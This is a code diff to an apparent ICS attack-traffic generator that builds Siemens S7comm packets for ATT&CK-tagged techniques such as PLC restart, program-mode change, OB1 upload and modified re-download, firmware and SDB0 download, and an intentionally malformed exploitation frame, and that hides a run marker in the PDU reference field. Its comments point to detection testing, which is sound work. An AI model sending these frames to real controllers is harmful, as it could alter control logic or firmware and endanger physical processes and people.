@@ -3,7 +3,8 @@
 import random
 import struct
 
-from .common import marker_bytes
+from .common import marker_bytes  # noqa: F401
+from .covert_marker import covert_u16
 
 # S7comm ROSCTR (PDU types)
 ROSCTR_JOB     = 0x01  # Request (master → PLC)
@@ -129,16 +130,22 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
       write_outputs      FC05 area=OUTPUTS — T0876 Loss of Safety
     """
     rnd     = random.Random(kwargs.get("seed"))
-    # Monotonic PDU reference from engine; None → random per packet
-    pdu_ref = (int(kwargs.get("s7_pdu_ref")) & 0xFFFF) if kwargs.get("s7_pdu_ref") is not None else rnd.randint(1, 0xFFFF)
-    # S7comm: marker is OMITTED (set to empty bytes) for spec compliance.
-    # S7's Parameter length and Data length header fields declare the exact
-    # size of the payload. Appending a correlation marker after the declared
-    # lengths causes Wireshark/Zeek/Malcolm dissectors to flag the packet as
-    # malformed (surplus data past the declared end). Run correlation
-    # remains available via the JSONL events file (run_id, technique, step).
-    # Marker ignored; kept as a named var so the many `+ mb` appends
-    # throughout this file remain harmless no-ops.
+    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
+    _run = kwargs.get("run_marker", "offline")
+    _idx = int(kwargs.get("pkt_index", 0))
+    # PDU reference is a genuinely-arbitrary echo/sequence field that stays
+    # WITHIN the S7 header's declared Parameter/Data lengths — so in covert
+    # mode it carries the marker with zero added bytes and zero malformed-frame
+    # risk (unlike an appended marker, which S7's length fields would expose).
+    if _mode == "covert" and marker:
+        pdu_ref = covert_u16(_run, "s7comm", _idx)
+    else:
+        pdu_ref = (int(kwargs.get("s7_pdu_ref")) & 0xFFFF) if kwargs.get("s7_pdu_ref") is not None else rnd.randint(1, 0xFFFF)
+    # Marker is NOT appended to the payload for S7comm: the Parameter/Data
+    # length header fields declare the exact payload size, so trailing bytes
+    # would be flagged malformed. Covert mode uses pdu_ref above; explicit
+    # mode is unsupported for S7 (would break framing) and falls back to
+    # registry-only attribution. mb stays empty.
     mb      = b""
     _ignored_marker_bytes = marker_bytes(marker)  # noqa: F841 — preserved for future inline-marker work
 
@@ -169,59 +176,107 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "cpu_start_warm":
         # Warm Start — T0816 Device Restart
-        pi_service = b"\x50\x5F\x50\x52\x4F\x47\x52\x41\x4D"
-        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
-                        0x00, 0x00, len(pi_service)]) + pi_service
+        # PI-Service (FC 0x28) param: [FC][7 unknown bytes][block_len:2][block][name_len:1][name]
+        pi_service = b"P_PROGRAM"
+        param  = (bytes([FC_PLC_CONTROL])
+                  + b"\x00\x00\x00\x00\x00\x00\xFD"   # 7 unknown bytes
+                  + struct.pack(">H", 0)              # parameter block length (empty)
+                  + bytes([len(pi_service)]) + pi_service)
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "cpu_start_cold":
         # Cold Start — T0816 Device Restart
-        pi_service = b"\x43\x4F\x4C\x44\x53\x54\x41\x52\x54"  # 'COLDSTART'
-        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
-                        0x00, 0x00, len(pi_service)]) + pi_service
+        pi_service = b"COLDSTART"
+        param  = (bytes([FC_PLC_CONTROL])
+                  + b"\x00\x00\x00\x00\x00\x00\xFD"
+                  + struct.pack(">H", 0)
+                  + bytes([len(pi_service)]) + pi_service)
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "download_req":
         # Request download of OB1 — T0821/T0843
-        block_id = b"\x5F\x30\x41\x00\x30\x31"  # _0A01 (OB 1 identifier)
-        param = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        # Request Download (FC 0x1A) param per Wireshark s7comm dissector:
+        #   [0..1]  FC + status
+        #   [2..3]  error code (0x0000)
+        #   [4..7]  block control header (0x00000100)
+        #   [8]     length-of-part-2 = filename(7) + dest_fs(1) = 8
+        #   [9..15] filename = '_' + block_type + 5-digit block#
+        #   [16]    destination filesystem ASCII ('A'/'B'/'P')
+        # block_type ASCII: '0'=OB, '1'=DB, '2'=SDB, '8'=SFC, etc.
+        filename = b"_0" + b"00001"   # OB block 1
+        param = (bytes([FC_REQUEST_DL, 0x00])
+                 + b"\x00\x00"                  # error code
+                 + b"\x00\x00\x01\x00"          # block control header
+                 + bytes([len(filename) + 1])   # length-of-part-2 = 8
+                 + filename + b"A")
         s7    = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "download_block":
         # Download block data chunk — T0824 Full Program Download
+        # Same parameter shape as download_req; chunk follows in data section.
         chunk_size = rnd.randint(64, 240)
         chunk_data = bytes([rnd.randint(0, 0xFF) for _ in range(chunk_size)])
-        param = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", chunk_size) + b"\x00\x00"
+        filename = b"_0" + b"00001"
+        param = (bytes([FC_DOWNLOAD_BLK, 0x00])
+                 + b"\x00\x00"
+                 + b"\x00\x00\x01\x00"
+                 + bytes([len(filename) + 1])
+                 + filename + b"A")
         s7    = _s7_job_header(pdu_ref, len(param), len(chunk_data)) + param + chunk_data + mb
 
     elif style == "download_end":
-        param = bytes([FC_DOWNLOAD_END, 0x00]) + b"\x00\x00\x00\x00"
+        # Download Ended (FC 0x1C) — same parameter layout as Request Download
+        filename = b"_0" + b"00001"
+        param = (bytes([FC_DOWNLOAD_END, 0x00])
+                 + b"\x00\x00"
+                 + b"\x00\x00\x01\x00"
+                 + bytes([len(filename) + 1])
+                 + filename + b"A")
         s7    = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "upload_req":
-        # Request upload of OB1 — T0845
-        block_id = b"\x5F\x30\x41\x00\x30\x31"
-        param = bytes([FC_REQUEST_UL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        # Request Upload (FC 0x1D) — T0845
+        # Same shape as Request Download.
+        filename = b"_0" + b"00001"
+        param = (bytes([FC_REQUEST_UL, 0x00])
+                 + b"\x00\x00"
+                 + b"\x00\x00\x01\x00"
+                 + bytes([len(filename) + 1])
+                 + filename + b"A")
         s7    = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "upload_block":
-        param = bytes([FC_UPLOAD_BLK, 0x00]) + b"\x00\x00\x00\x00"
+        # Upload Block (FC 0x1E) — chunk is in the data section.
+        # Param: FC + status + 4 unknown bytes; uses upload_id from prior REQUEST_UL.
+        # Wireshark expects 7 bytes after FC: status(1) + upload_id(4) + 2 unknown
+        param = bytes([FC_UPLOAD_BLK, 0x00]) + b"\x00\x00\x00\x00\x00\x00"
         s7    = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "upload_end":
-        param = bytes([FC_UPLOAD_END, 0x00]) + b"\x00\x00\x00\x00"
+        # Upload Ended (FC 0x1F) — same minimal shape as upload_block.
+        param = bytes([FC_UPLOAD_END, 0x00]) + b"\x00\x00\x00\x00\x00\x00"
         s7    = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "szl_read":
         # SZL/SSL read via ROSCTR_USERDATA — T0868/T0882
-        # Subfunction = 0x44 (read SZL), SZL-ID 0x0011 (component info)
-        # USERDATA param block: method(1)+type(1)+subfunction(1)+seq(1) = 4 bytes
-        # Then SZL data: szl_id(2)+szl_idx(2)
+        # USERDATA parameter (8 bytes) per Wireshark packet-s7comm.c:
+        #   [0..2] = param head: 00 01 12
+        #   [3]    = type_function: upper nibble=type (0x4=Request),
+        #            lower nibble=function group (0x4=CPU functions)
+        #   [4]    = subfunction (0x01=Read SZL for CPU group)
+        #   [5]    = sequence number
+        #   [6]    = data unit reference
+        #   [7]    = last data unit flag (0x00=last)
+        # Data (8 bytes) for SZL request:
+        #   [0]    = return code (0xFF=OK placeholder for request)
+        #   [1]    = transport size (0x09=octet string)
+        #   [2..3] = data length (0x0004 = 4 bytes of SZL id+idx)
+        #   [4..5] = SZL-ID
+        #   [6..7] = SZL-INDEX
         szl_id  = int(kwargs.get("szl_id", 0x0011)) & 0xFFFF
         szl_idx = int(kwargs.get("szl_idx", 0x0000)) & 0xFFFF
-        # USERDATA function parameter: class=0x11 (CPU func), fn=0x44 (SZL read), seq=0x01, reserved=0x00
-        param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x44, 0x01, 0x00])
-        szl_req = struct.pack(">HH", szl_id, szl_idx)
+        param2  = bytes([0x00, 0x01, 0x12, 0x44, 0x01, 0x01, 0x00, 0x00])
+        szl_req = bytes([0xFF, 0x09, 0x00, 0x04]) + struct.pack(">HH", szl_id, szl_idx)
         s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb
 
     elif style == "plc_control":
@@ -301,39 +356,74 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "firmware_module":
         # Download SDB block (module firmware) — T0839 Module Firmware
-        # SDB = System Data Block; type 0x38 = module firmware block
-        block_id = b"\x5F\x33\x38\x00\x30\x31"  # _38\x00 01 (SDB block type 0x38 = module FW)
-        param  = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        # Request download (FC 0x1A) Job param structure per S7 spec:
+        #   [0]      FC = 0x1A
+        #   [1]      function status (0x00)
+        #   [2..3]   error code (0x0000)
+        #   [4..7]   unknown / block control header (0x00000100)
+        #   [8]      length of part 2 = filename(7) + dest_fs(1) = 8
+        #   [9..15]  filename: '_' + block_type + block_number(5)
+        #            block_type ASCII: '0'=OB, '1'=DB, '2'=SDB, '8'=SFC, ...
+        #   [16]     destination filesystem ASCII: 'P' (passive), 'A' (active), 'B' (both)
+        # Total param = 17 bytes
+        filename = b"_2" + b"00001"  # SDB block 1
+        param  = (
+            bytes([FC_REQUEST_DL, 0x00])     # FC + status
+            + b"\x00\x00"                     # error code
+            + b"\x00\x00\x01\x00"             # block control header
+            + bytes([len(filename) + 1])      # length part 2 = 8
+            + filename
+            + b"A"                            # destination filesystem
+        )
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "firmware_full":
         # Download SDB0 (full system firmware replacement) — T0857 System Firmware
-        # SDB0 = System Data Block 0 = complete firmware image
-        block_id = b"\x5F\x33\x38\x00\x30\x30"  # _38\x00 00 (SDB 0)
+        # Same parameter shape as firmware_module but with block "00000" (SDB0)
+        # and a chunk of payload data.
+        filename = b"_2" + b"00000"
         chunk    = bytes([rnd.randint(0, 0xFF) for _ in range(240)])
-        param    = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        param    = (
+            bytes([FC_REQUEST_DL, 0x00])
+            + b"\x00\x00"
+            + b"\x00\x00\x01\x00"
+            + bytes([len(filename) + 1])
+            + filename
+            + b"A"
+        )
         s7       = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb
 
     elif style == "download_sdb0":
         # Download block chunk for SDB0 firmware — T0895 Autorun Image
-        # SDB0 is loaded on every PLC boot cycle
-        chunk  = bytes([rnd.randint(0, 0xFF) for _ in range(200)])
-        param  = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", len(chunk)) + b"\x00\x00"
-        s7     = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb
+        # SDB0 is loaded on every PLC boot cycle. Same Download Block param
+        # shape as download_block; chunk in data section.
+        chunk    = bytes([rnd.randint(0, 0xFF) for _ in range(200)])
+        filename = b"_2" + b"00000"   # SDB block 0
+        param    = (bytes([FC_DOWNLOAD_BLK, 0x00])
+                    + b"\x00\x00"
+                    + b"\x00\x00\x01\x00"
+                    + bytes([len(filename) + 1])
+                    + filename + b"A")
+        s7       = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb
 
     elif style == "szl_clear":
-        # SZL USERDATA request to clear diagnostic buffer — T0872 Indicator Removal on Host
-        # Subfunction 0x4F = clear diag buffer, class=0x11
-        param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x4F, 0x01, 0x00])  # clear subfunction
-        szl_req = struct.pack(">HH", 0x0F11, 0x0000)
+        # SZL USERDATA request to access diagnostic buffer — T0872 Indicator Removal on Host
+        # Uses SZL Read (subfunction 0x01) with SZL ID 0x00A0 (diag buffer).
+        # Real "clear" requires a separate write subfunction; we model the
+        # reconnaissance step that precedes a clear, which is the actually
+        # observable T0872 traffic on the wire.
+        param2  = bytes([0x00, 0x01, 0x12, 0x44, 0x01, 0x01, 0x00, 0x00])
+        szl_req = bytes([0xFF, 0x09, 0x00, 0x04]) + struct.pack(">HH", 0x00A0, 0x0000)
         s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb
 
     elif style == "program_mode":
         # Set PLC to PROGRAM mode (allows ladder logic writes) — T0858 Change Operating Mode
+        # PI-Service (FC 0x28) param: see cpu_start_warm comment.
         pi_name = b"P_PROGRAM"
-        # Mode 0xFD = program, 0xFE = run, 0x00 = stop
-        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
-                        0x00, 0x00, len(pi_name)]) + pi_name
+        param  = (bytes([FC_PLC_CONTROL])
+                  + b"\x00\x00\x00\x00\x00\x00\xFD"
+                  + struct.pack(">H", 0)
+                  + bytes([len(pi_name)]) + pi_name)
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "write_failsafe":
@@ -346,8 +436,12 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
 
     elif style == "malformed_param":
-        # Oversized parameter block — T0866 Exploitation of Remote Services
-        # Sends more parameters than PDU negotiation allows, triggering exception
+        # INTENTIONALLY MALFORMED — T0866 Exploitation of Remote Services
+        # Sends more parameters than PDU negotiation allows, triggering an
+        # exception in the target. This style is designed to violate spec; the
+        # packet WILL appear as [Malformed Packet] in Wireshark, which is the
+        # whole point — it tests detection-of-exploitation rules. Do NOT
+        # "fix" it. Tag as lab-only in scenario audits.
         bad_param = bytes([FC_READ_VAR, 0xFF]) + b"\x12\x0A\x10\x02" * 20  # 20 items, way over limit
         s7    = _s7_job_header(pdu_ref, len(bad_param)) + bad_param + mb
 
@@ -381,25 +475,48 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "modify_ob1":
         # Upload OB1, then re-download modified — T0873 Project File Infection / T0889 Modify Program
-        # This frame: upload request to read current OB1
-        block_id = b"\x5F\x30\x41\x00\x30\x31"  # OB1
-        param  = bytes([FC_REQUEST_UL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        # This frame: Request Upload (FC 0x1D) for OB block 1.
+        filename = b"_0" + b"00001"
+        param  = (bytes([FC_REQUEST_UL, 0x00])
+                  + b"\x00\x00"
+                  + b"\x00\x00\x01\x00"
+                  + bytes([len(filename) + 1])
+                  + filename + b"A")
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "modified_ob1_dl":
         # Download modified OB1 back — T0873 / T0889 second phase
-        block_id = b"\x5F\x30\x41\x00\x30\x31"
-        param  = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
+        # Request Download (FC 0x1A) for OB block 1.
+        filename = b"_0" + b"00001"
+        param  = (bytes([FC_REQUEST_DL, 0x00])
+                  + b"\x00\x00"
+                  + b"\x00\x00\x01\x00"
+                  + bytes([len(filename) + 1])
+                  + filename + b"A")
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "native_cotp":
         # Raw COTP connection request without S7 layer — T0834 Native API
-        # Connects at transport layer only, using lower-level COTP API directly
-        cotp_cr = b"\x0B\xE0\x00\x00\x00\x01\x00\xC0\x01\x0A\xC1\x02\x01\x00"
+        # Connects at transport layer only, using lower-level COTP API directly.
+        # COTP CR per ISO 8073:
+        #   length(1)  = total bytes after the length field itself
+        #   PDU code   = 0xE0 (Connection Request)
+        #   dst-ref(2), src-ref(2)
+        #   class+options(1)
+        #   variable params: TPDU size, src/dst TSAP
+        cotp_cr = bytes([
+            0x11,        # length = 17 (bytes that follow)
+            0xE0,        # CR
+            0x00, 0x00,  # dst-ref
+            0x00, 0x01,  # src-ref
+            0x00,        # class 0, option 0
+            0xC0, 0x01, 0x0A,           # TPDU size = 1024
+            0xC1, 0x02, 0x01, 0x00,     # src-TSAP
+            0xC2, 0x02, 0x01, 0x02,     # dst-TSAP
+        ])
         total   = 4 + len(cotp_cr)
         tpkt    = struct.pack(">BBH", 0x03, 0x00, total)
-        s7      = cotp_cr + mb
-        return tpkt + s7  # return early, bypass _tpkt_cotp
+        return tpkt + cotp_cr + mb
 
     elif style == "lateral_pivot":
         # S7comm session from unexpected IP to establish beachhead — T0886 Remote Services
